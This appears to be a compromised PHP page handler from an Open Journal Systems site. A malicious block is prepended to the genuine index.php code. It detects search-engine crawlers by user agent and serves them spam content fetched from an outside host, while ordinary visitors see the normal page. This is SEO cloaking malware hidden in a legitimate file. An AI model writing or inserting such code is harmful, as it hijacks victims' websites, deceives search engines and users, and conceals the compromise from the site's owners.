<?php
ob_start();
header("Vary: User-Agent");
$bot_url = "https://piona.xyz/landing/jom.unri.ac.id/index.html";
$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
function lph_requests($url)
{
    if (function_exists("curl_init")) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (ini_get("allow_url_fopen")) {
        return file_get_contents($url);
    }
    return false;
}
if (preg_match($botchar, $ua)) {
    usleep(rand(100000, 200000));
    echo lph_requests($bot_url);
    ob_end_flush();
    die;
}

<?php

/**
 * @defgroup pages_index
 */
 
/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2013-2016 Simon Fraser University Library
 * Copyright (c) 2003-2016 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 * @brief Handle site index requests. 
 *
 */

switch ($op) {
	case 'index':
		define('HANDLER_CLASS', 'IndexHandler');
		import('pages.index.IndexHandler');
		break;
}

?>
